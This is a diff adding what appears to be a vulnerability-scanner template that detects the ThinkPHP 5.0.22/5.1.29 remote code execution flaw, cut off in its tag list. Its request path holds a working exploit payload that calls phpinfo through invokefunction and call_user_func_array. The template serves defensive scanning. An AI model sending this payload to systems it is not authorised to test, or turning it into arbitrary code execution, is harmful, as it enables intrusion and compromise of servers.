@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - condition: and
+          type: word
+          words:
+            - PHP Extension
+            - PHP Version
+            - ThinkPHP
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
+id: thinkphp-5022-rce
+info:
+    author: dr_set
+    description: ThinkPHP 5.0.22 and 5.1.29 are susceptible to remote code execution if the website doesn't have mandatory routing enabled, which is the default setting. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+    metadata:
+        max-request: 1
+    name: ThinkPHP - Remote Code Execution
+    reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
+    severity: critical
+    tags:
+        - thinkphp
+        - ThinkPHP
+        - phpinfo
+        - thin
